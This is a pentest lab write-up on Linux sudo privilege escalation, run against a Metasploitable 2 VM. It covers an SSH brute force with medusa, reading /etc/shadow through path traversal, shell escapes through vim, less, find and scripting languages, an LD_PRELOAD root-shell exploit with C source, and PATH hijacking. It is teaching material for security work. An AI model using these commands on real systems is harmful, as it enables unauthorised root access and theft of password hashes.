<h1 align="center"> SUDO Exploitation </h1>



<img width="1000" height="600" alt="image" src="https://www.datocms-assets.com/75231/1657645300-sudo-1.png?fm=webp" />



## Content Tables:
1. [Basic SUDO Usage](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/5.%20SUDO_Exploitation.md#basic-sudo-usage)
2. [Understanding SUDO Configuration](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/5.%20SUDO_Exploitation.md#understanding-sudo-configuration)
3. [Reading SUDO configuration file](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/5.%20SUDO_Exploitation.md#reading-sudo-configuration-file)
4. [Privileges Demo](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/5.%20SUDO_Exploitation.md#priv-demo)
5. [Finding SUDO Vulnerable](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/5.%20SUDO_Exploitation.md#finding-sudo-vulnerable)
6. [Common SUDO Miconfigurations](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/5.%20SUDO_Exploitation.md#common-sudo-miconfigurations)
7. [NOPASSWD Privileges](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/5.%20SUDO_Exploitation.md#nopasswd-privileges)
8. [SUDO Exploitation Techniques](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/5.%20SUDO_Exploitation.md#sudo-exploitation-techniques)







## What is SUDO Exploitation?
SUDO (SuperUser DO) allows permitted users to execute commands as another user (usually root) based on security policies defined in /etc/sudoers.

### What is sudo?
- `sudo` stands for `superuser do`.
- It lets a normal user run commands with elevated privileges (often root).
- Access is controlled by the sudoers file (`/etc/sudoers`), which specifies who can run what.

- **Sudo exploitation = abusing sudo misconfigurations or vulnerabilities to escalate privileges**.




# SUDO Exploitation Methodology

- In this i used with my `Metasploitable 2`.
<img width="934" height="643" alt="image" src="https://github.com/user-attachments/assets/51e59b71-b24a-4136-874f-bfc6b9f59f83" />


## Information Gathering and crack Password (SSh) target:

### Scan
- First i need to scan target:
````
nmap -sV -T4 192.168.127.0/24
````
<img width="1385" height="818" alt="image" src="https://github.com/user-attachments/assets/f0240bdf-865a-454f-8c11-faf45cefacea" />

````
nmap -sV -p 22 -T4 192.168.127.129
````
<img width="993" height="282" alt="image" src="https://github.com/user-attachments/assets/24bdbca4-4979-45ee-ba3d-05f8b58854ae" />

- Now we see the target open port `SSH` service.

### Crack Password SSH:
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ssh -t 5 -f
````
<img width="1679" height="266" alt="image" src="https://github.com/user-attachments/assets/015efb9a-f42a-49a5-851d-868e1e15ab7e" />

- Now we got the correct `Usernmae` & `Password`.
````
Username: msfadmin
Password: msfadmin
````


- After i login to target `SSH` port:
````
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.127.129
````
<img width="1040" height="484" alt="image" src="https://github.com/user-attachments/assets/c238ec6d-9406-4f1a-a07b-2ccd4494ddd9" />

- we got success to login to Targe port `SSH`>

- Or if the server only supports DSA:
````
ssh -o HostKeyAlgorithms=+ssh-dss msfadmin@192.168.127.129
````
---





## Basic SUDO Usage:

- First to make out `terminal` can `clear terminal`: 
````
export TERM=xterm
````
<img width="498" height="93" alt="image" src="https://github.com/user-attachments/assets/20c207e1-f2b4-4f44-8cc7-4688d496b069" />


### Syntax:
````
sudo [command]
````
---


````
sudo whoami
````
<img width="429" height="88" alt="image" src="https://github.com/user-attachments/assets/e249da10-4c90-4b65-8eea-3fb42cf48e50" />

- Open shell as root
````
sudo su
````
<img width="682" height="243" alt="image" src="https://github.com/user-attachments/assets/a85bc5d0-ab6d-4197-8c24-2a65e3179034" />

- To exit this type `exit`.

````
sudo -l
````
<img width="827" height="132" alt="image" src="https://github.com/user-attachments/assets/7732fc0c-e65c-4d2f-bc18-87e6cc943efc" />

- Our result:
````
User msfadmin may run the following commands on this host:
    (ALL) ALL
````
- `(ALL)ALL`: Means:
  - The user `msfadmin` can run any command as any user (including root).
  - No restrictions are applied in the sudoers file.

- `Root` shell direct:
````
sudo /bin/bash
````
<img width="594" height="89" alt="image" src="https://github.com/user-attachments/assets/57796868-bd28-4488-bd9b-afb95a7a198e" />


````
sudo -i
````
<img width="530" height="154" alt="image" src="https://github.com/user-attachments/assets/cd66666f-22a1-45f0-9b64-a90e40a9afba" />

````
sudo bash
````
<img width="512" height="113" alt="image" src="https://github.com/user-attachments/assets/a275bc10-01e4-4316-8fc8-b73cc3b47c79" />


#### Exeecute as specific user:
````
sudo -u mysql whoami
````
<img width="699" height="126" alt="image" src="https://github.com/user-attachments/assets/5c61ce30-c7bb-4236-a8e5-7e921370a557" />


### SUDO Options:

#### SUDO Common Usage Table:
| **Option / Syntax** | **Meaning**                                                      |
| ------------------- | ---------------------------------------------------------------- |
| `sudo -h`           | Show help message                                                |
| `sudo -K`           | Remove cached credentials completely (forget password timestamp) |
| `sudo -k`           | Expire timestamp (force password next time)                      |
| `sudo -L`           | List default sudoers options                                     |
| `sudo -l`           | List allowed commands for current user                           |
| `sudo -V`           | Show sudo version and configuration                              |
| `sudo -v`           | Validate user credentials (refresh timestamp)                    |


#### Geberal SUDO Command Syntax:
| **Syntax**                              | **Description**                                   |    |             |                                                    |
| --------------------------------------- | ------------------------------------------------- | -- | ----------- | -------------------------------------------------- |
| `sudo [-bEHPS] [-p prompt] [-u username | #uid] [VAR=value] {-i                             | -s | <command>}` | Main syntax with options and environment variables |
| `sudo -e file`                          | Edit file as root using default editor (sudoedit) |    |             |                                                    |


#### Common Options:
| **Option**                 | **Meaning**                                                         |
| -------------------------- | ------------------------------------------------------------------- |
| `-b`                       | Run command in background                                           |
| `-E`                       | Preserve user environment variables                                 |
| `-H`                       | Set HOME variable to target user’s home                             |
| `-P`                       | Preserve group vector instead of setting it to target user's groups |
| `-S`                       | Read password from standard input                                   |
| `-p prompt`                | Use a custom password prompt                                        |
| `-u username` or `-u #uid` | Run command as another user                                         |
| `-i`                       | Run an interactive login shell as root                              |
| `-s`                       | Run a shell as root                                                 |



---


## Understanding SUDO Configuration
### The `/etc/sudoers` file structures:

#### User privilege specification
````
root    ALL=(ALL:ALL) ALL
````
#### Allow members of group sudo to execute any command
````
%sudo   ALL=(ALL:ALL) ALL
````
#### User-specific rules
````
alice   ALL=(ALL) NOPASSWD: /usr/bin/apt
````
#### Command-specific rules
````
bob     server1=(root) /usr/bin/systemctl restart apache2
````
#### Alias:
````
User_Alias ADMINS = alice, bob
Cmd_Alias PROCESS = /bin/kill, /usr/bin/killall
Host_Alias WEBSERVERS = server1, server2
ADMINS WEBSERVERS = (root) PROCESS
````



### Checking our SUOD Privileges:

#### Check what you can run as sudo
````
sudo -l
````
<img width="796" height="139" alt="image" src="https://github.com/user-attachments/assets/b69f8c9a-f5e7-4792-bfa1-cc8f68824583" />

- `(ALL) ALL` means:
  - The user `msfadmin` can run any command as any user (including root).
  - No restrictions are applied in the sudoers file


####  
````
sudo -L
````
<img width="1014" height="801" alt="image" src="https://github.com/user-attachments/assets/14cab90a-d5be-46e1-89c3-52ab142285ab" />

- The `sudo -L`: command lists all available Defaults options that can be configured in the `/etc/sudoers` file. These control how sudo behaves — from logging and authentication to environment handling and user experience.

- **Here are some key options from your output that matter for exploitation**:
  - `authenticate`: Requires users to authenticate before running sudo (default).
  - `rootpw`, `targetpw`, `runaspw`: Change who’s password is required — root’s, target user’s, or runas_default.
  - `requiretty`: Requires a TTY for sudo — if enabled, it blocks sudo in non-interactive shells (important for remote exploits).



#### Sample output:
````
Matching Defaults entries for alice on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on localhost:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/apt
    (root) /usr/bin/vim /etc/hosts
````


---



## Reading SUDO configuration file:
- **Definition**: Text files that store parameters, options, and preferences for operating systems, applications, and services.
- **Purpose**: Control system behavior without modifying source code.
- Location:
  - System-wide configs: `/etc/` (e.g., `/etc/ssh/sshd_config`)
  - User-specific configs: `~/.config/` or hidden dotfiles (`~/.bashrc`)
  - Application configs: Often inside `/etc/appname/` or `/usr/local/etc/`.




### Check **sudoers**:
````
sudo -i
cd /home
````
<img width="524" height="131" alt="image" src="https://github.com/user-attachments/assets/47d79829-c7b8-4b3f-89c2-3af0b2c1a373" />


````
cat /etc/sudoers
````
<img width="913" height="667" alt="image" src="https://github.com/user-attachments/assets/500c62c6-e029-47e5-8cb5-66fea15cc2d0" />

````
less /etc/sudoers
````
<img width="628" height="78" alt="image" src="https://github.com/user-attachments/assets/2bce2485-0021-4308-8c8c-47e2f6094ca6" />

<img width="895" height="740" alt="image" src="https://github.com/user-attachments/assets/ce115006-a42a-4ce3-82a0-258fd5929eca" />

- `less`: is a pager program in Linux/Unix. It lets you view the contents of a file one screen at a time, with scrolling and searching capabilities.
- `/etc/sudoers`: is the configuration file that defines which users and groups can run commands as root (or other users) using sudo.

#### Explain about result:
````
sudo visudo
````
- View (read-only).

- Header and guidance
  - Comment lines: Start with `#`; they explain usage and warn to use `visudo`.
  - Man page hint: Points you to `man sudoers` for full syntax and examples.
- Defaults
  - Line: `Defaults env_reset`
  - Meaning: When using sudo, environment variables are reset to a safe baseline. This reduces risk from environment-based privilege escalation (e.g., PATH or LD_* tricks).
- Optional passwordless sudo for group sudo (commented)
  - Line: # `%sudo ALL=NOPASSWD: AL`L
  - Meaning: If uncommented, any user in group `sudo` could run any command via sudo without a password.
  - Current state: Commented, so not active.
- Privilege entries
  - Line: `root ALL=(ALL) ALL`
  - Meaning: The `root` user can run any command as any user on any host. This is standard.
  - Line: `%admin ALL=(ALL) ALL`
  - Meaning: Any user in the `admin` group can run any command via sudo (they will be prompted for a password unless NOPASSWD is specified elsewhere). Common on older Ubuntu/Debian systems.
  - Line (dangerous): `backdoor ALL=(ALL) NOPASSWD:ALL`
  - Meaning: User `backdoor` can run any command as any user, on any host, with sudo, and will NOT be asked for a password.
  - Impact: Unrestricted, passwordless root access. This is a deliberate backdoor/misconfiguration and is a critical security risk


#### What an attacker or tester can do with these rules:
- Confirm access:
  - `sudo -l` → shows allowed commands.
- Exploit passwordless entry (backdoor):
  - `sudo whoami`:
    - Expected output: `root`
- `sudo /bin/bash`:
  - Drops into a root shell immediately.



#### Vim Exit:
| **Action**                  | **Command** | **What it does**                        | **Notes / When to use**                    |
| --------------------------- | ----------: | --------------------------------------- | ------------------------------------------ |
| Save and exit               |       `:wq` | Writes file to disk then quits Vim      | Common when you finished editing           |
| Save and exit (shortcut)    |        `zz` | Writes file if changed and quits Vim    | Quick alternative to `:wq`                 |
| Exit without saving (force) |       `:q!` | Quits Vim and discards unsaved changes  | Use when you want to abandon edits         |
| Save without exiting        |        `:w` | Writes changes to file but stays in Vim | Useful to checkpoint work                  |
| Quit only (no changes)      |        `:q` | Quits Vim if file was not modified      | If file modified, Vim will warn and refuse |


#### Step-by-step Workflow
| **Step** | **Action**         | **What to do**                                               |
| -------: | ------------------ | ------------------------------------------------------------ |
|        1 | Ensure Normal mode | Press `Esc` to return to Normal mode                         |
|        2 | Enter Command-line | Type `:` to open the command prompt (bottom of screen)       |
|        3 | Type command       | Enter one of the commands above (e.g., `wq`, `q!`, `w`, `q`) |
|        4 | Execute            | Press `Enter` to run the command                             |


---



## Priv Demo:

### Example 1:

#### Confirm sudo access:
````
sudo -l
````
<img width="785" height="143" alt="image" src="https://github.com/user-attachments/assets/6e044ffd-9569-4653-b6a0-3da7aadf1192" />


#### Spawn a shell as scriptmanager
- Use Python to spawn an interactive shell:
````
sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
````
<img width="1226" height="152" alt="image" src="https://github.com/user-attachments/assets/8cb8690e-e33d-4215-97af-c27694322fb9" />

- If it show `sudo: python3: command not found`, after try this:
````
sudo -u scriptmanager python -c 'import pty; pty.spawn("/bin/bash")'
````
<img width="1195" height="172" alt="image" src="https://github.com/user-attachments/assets/0ea0a9f2-bcc6-4fec-bc6b-30a204ffeea0" />

- Now we got `scripptmanager` shell.

- `sudo -u scriptmanager`:
  - `sudo`: run a command with elevated privileges.
  - `-u scriptmanager`:  tells sudo tto run the command **as the user** `scriptmanager`, not as root.
  - This is possible because our sudoers file allows you to run commands as `scriptmanager`

- `python -c '...'`:
  - `python`: runs the python interpreter.
  - `-c '...'`: execute the code provided inside quotes directly from the command line (instead of a script file).
 
- `'import pty; pty.spawn("/bin/bash")'`
  - `import pty`: load python's **pseudo-terminal (pty)** module.
  - `pty.spawn("/bin/bash")'`: starts a new interactive bash shell inside a pseudo-terminal.
  - This trick is often used to upgrade a limited shell into a fully interactive one (with proper input/output handling).


---




## Finding SUDO Vulnerable:

### Enumeration Commands:

#### Basic sudo check
````
sudo -l
````
<img width="760" height="115" alt="image" src="https://github.com/user-attachments/assets/47b705ab-adab-493a-9b02-355be4495041" />


#### Check sudoers file (if readable)
````
cat /etc/sudoers
````
<img width="826" height="634" alt="image" src="https://github.com/user-attachments/assets/b785dab8-70d4-445e-b517-79ed1096b5f3" />

#### Check for wildcards in sudo rules:
````
grep -r "\\*" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
````
<img width="880" height="113" alt="image" src="https://github.com/user-attachments/assets/0d844fc2-7f8d-4855-a8d8-a96a84483dd5" />

- `grep -r "\\*"`: recursively search for the literal `*` character in files.
  - The double backslash `\\*` is needed because `*` is a special regex symbol.
- `/etc/sudoers /etc/sudoers.d/`: search inside the main sudoers file and any included configs.
- `2>/dev/null`: suppress error messages (like permission denied).


- But we got no output:
  - There are **no literale `*` characters** in our `/etc/sudoers` or `/etc/sudoers.d` files. 
  - There sudoers entries we saw ealier `(ALL)ALL` use `ALL`, not `*`.
  - That's why `grep` returned nothing.
 
##### In this we can use others command like:
- Search for `ALL`:
````
grep -r "ALL" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
````
- Search for `BOPASSWD`:
````
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
````
- Search for specific usernames:
````
grep -r "msfadmin" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
````


---



## Common SUDO Miconfigurations:
### Wildcard Abuse:
- Vulnerable rule in sudoers:
- User ALL=(ALL) NOPASSWD: /usr/bin/cat var/log/*
- Then exploitation:
````
sudo cat /var/log/../../etc/shadow
````
<img width="751" height="790" alt="image" src="https://github.com/user-attachments/assets/51bb350b-8d02-4d5e-a4c7-8ec89e97054a" />

<img width="766" height="812" alt="image" src="https://github.com/user-attachments/assets/40baaf5c-dfee-48b2-8db1-ab85d8dd7f47" />

1. `sudo`:
- Runs the command with elevated privileges (root, in your case since you have `(ALL) ALL`).
2. `cat`:
- Prints the contents of a file to the terminal.
3. `/var/log/../../etc/shadow`:
- This is a path traversal trick.
- `..` means “go up one directory.”
- So starting at `/var/log/`:
  - `/var/log/..`: `/var/`
  - `/var/log/../..`: `/`
  - `/var/log/../../etc/shadow`: `/etc/shadow`




### NOPASSWD Privileges:
- In this for this rule: `user ALL=(ALL) NOPASSWD: /usr/bin/find`:
````
sudo find /home -exec /bin/sh \;
````
<img width="623" height="177" alt="image" src="https://github.com/user-attachments/assets/8957c592-05f8-4b61-bc63-fa7235dc1f81" />

- `/home`: directory to search.
- `-exec /bin/sh \;`:  for each result, execute `/bin/sh`.
- Since you’re running with `sudo`, the shell will be spawned with elevated privileges.



#### LD_PRELOAD Allowed
- Rule: user ALL=(ALL) SETENV: NOPASSWD: ALL
- Explotation:
````
sudo LD_PRELOAD=/tmp/exploit.so whoami
````
<img width="781" height="123" alt="image" src="https://github.com/user-attachments/assets/887f4845-fc32-4adc-8ac9-b5ff01f5a12e" />

- `sudo`: run the command as root.
- `LD_PRELOAD=/tmp/exploit.so`: tells the dynamic linker (`ld.so`) to load a shared object (`.so` file) before any others. This is often abused to inject malicious code into privileged processes.
- `whoami`: prints the current user.

- You Saw the Error
  - The file `/tmp/exploit.so` doesn’t exist (or isn’t a valid shared object).
  - The dynamic linker tried to load it, failed, and ignored it.
  - That’s why you got the error message.


---





##  SUDO Exploitation Techniques:

### **Technique 1**: Shell Escape Sequences

Many programs have built-in shell escape sequences. If you can sudo them, you can escape to a shell.

#### A. Editors (vim, nano, less, more)
- Vim
````
sudo vim -c ':!/bin/sh'
````
<img width="549" height="175" alt="image" src="https://github.com/user-attachments/assets/442bff56-7ff9-4bd4-bbb8-d53e4e16e502" />

Or 
````
sudo vim
````
Then type :!bin/sh



- Less/More
````
sudo less /etc/passwd
````
- Type: `!/bin/sh`
<img width="441" height="64" alt="image" src="https://github.com/user-attachments/assets/78e445c0-b847-4ddf-a23a-7a58bc3ad7b8" />

<img width="740" height="654" alt="image" src="https://github.com/user-attachments/assets/6ce15c8a-df45-4c7e-8e37-10f607171336" />

<img width="727" height="656" alt="image" src="https://github.com/user-attachments/assets/cd82cb81-36c4-4647-84f5-c50dd491e8ea" />

- After press `Enter`:
<img width="472" height="130" alt="image" src="https://github.com/user-attachments/assets/c9668fd4-0f6b-4e95-b727-f2140fd330eb" />

- Now we got `root` shell.



#### Programming Languages (python, perl, ruby)
- Python:
````
sudo python -c 'import os; os.system("/bin/sh")'
````
<img width="635" height="170" alt="image" src="https://github.com/user-attachments/assets/c0831672-9137-4c45-9088-c7ef75edc7af" />


- Perl:
````
sudo perl -e 'exec "/bin/sh";'
````
<img width="622" height="119" alt="image" src="https://github.com/user-attachments/assets/73334c52-eb79-4513-aa5c-b36bf1013364" />


- Ruby
````
sudo ruby -e 'exec "/bin/sh"'
````
<img width="483" height="100" alt="image" src="https://github.com/user-attachments/assets/8a0022e7-0f5e-45ed-bc9f-8c3b0cbadd99" />



#### File Operations (cp):

- Create SUID bash:
````
echo '#!/bin/bash' > /tmp/bash
echo '/bin/bash -p' >> /tmp/bash
chmod +x /tmp/bash
sudo cp /tmp/bash /usr/local/bin/ -p
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
````
<img width="727" height="189" alt="image" src="https://github.com/user-attachments/assets/c3bd5da2-9f92-4648-a0ad-d2b4eb4365e3" />


- This if i test with my kali linux:
<img width="524" height="281" alt="image" src="https://github.com/user-attachments/assets/3edead69-9e95-4ca7-9eed-9119933dde53" />

- Now i got successful to do privileges with my kali.
---



### **Technique 2**: LD_PRELOAD Exploitation

#### Check:
````
sudo -l
````
<img width="490" height="100" alt="image" src="https://github.com/user-attachments/assets/c33b5537-2a21-4971-8637-d8aec1c10f87" />


#### Create file:
````
nano /tmp/exploit.c
````
````
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
````
<img width="571" height="276" alt="image" src="https://github.com/user-attachments/assets/7bb071d9-af33-4d20-93b4-652821ee7957" />

- After to exit press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

````
ls -lh /tmp/exploit.c
cat /tmp/exploit.c
````
<img width="621" height="269" alt="image" src="https://github.com/user-attachments/assets/c5b9f372-693b-49a5-9532-02bd015f772f" />



#### Complie:
````
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
````
<img width="820" height="117" alt="image" src="https://github.com/user-attachments/assets/8abf373c-8393-4fc2-83ad-3572a2672128" />


#### Exploit:
````
sudo LD_PRELOAD=/tmp/exploit.so whoami
````
<img width="720" height="200" alt="image" src="https://github.com/user-attachments/assets/c40f7bd2-5818-4232-b4af-f6b62e1c63fe" />

- Now we got success to get `root shell`.

---


### **Technique 3**: PATH Manipulation
When sudo allows command execution without `secure_path`:

#### Check if secure_path is disabled
````
sudo -l | grep -v "secure_path"
````
<img width="542" height="119" alt="image" src="https://github.com/user-attachments/assets/ed8d595a-1e8e-412f-b731-c7b5c10ccf16" />


#### Create malicious binary
````
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash -p' >> /tmp/ls
chmod +x /tmp/ls
````
<img width="491" height="112" alt="image" src="https://github.com/user-attachments/assets/1a1d1970-d634-4dba-ae6d-33900c473e5b" />

#### Hijack Path:
````
export PATH=/tmp:$PATH
````
<img width="492" height="100" alt="image" src="https://github.com/user-attachments/assets/6799b0f9-3cab-4b6a-afaf-24b45ac31d10" />


#### Execute sudo with relative command
````
sudo ls
````
<img width="783" height="150" alt="image" src="https://github.com/user-attachments/assets/eac4c3eb-06da-4924-bf56-f1be479ef643" />

- Now we see a lots file, if i type normal `ls` i will see nothing:
<img width="847" height="186" alt="image" src="https://github.com/user-attachments/assets/eb2c8e54-6b97-4633-aa89-9d09a96778b7" />


---


### Check log
````
grep sudo /var/log/auth.log
````
<img width="1910" height="841" alt="image" src="https://github.com/user-attachments/assets/92c5a0bd-d1f5-4333-92bd-df748f3f74b6" />

- Now we see th command that hacker use currently.


----

<h1 align="center"> Finished Of SUDO Exploiation </h1>



<h2 align="center"> Author: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 3/12/2025 </h3> 
